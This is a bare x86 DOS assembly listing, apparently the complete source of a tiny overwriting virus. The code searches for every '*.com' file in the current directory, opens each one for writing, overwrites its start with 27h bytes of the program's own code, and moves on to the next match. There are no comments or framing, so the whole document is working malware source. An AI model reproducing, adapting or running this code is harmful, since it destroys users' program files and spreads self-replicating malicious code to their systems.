	xor	cx,cx
	mov	dx,offset File
	mov	ah,4eh
	int	21h
z:
	mov	dx,9eh
	mov	ax,3d02h
	int	21h
	mov	bx,ax
	mov	dx,100h
	mov	cl,27h
	mov	ah,40h
	int	21h
	mov	ah,3eh
	int	21h
	mov	ah,4fh
	int	21h
	jnc	z
	ret
file	db	'*.com',0
e: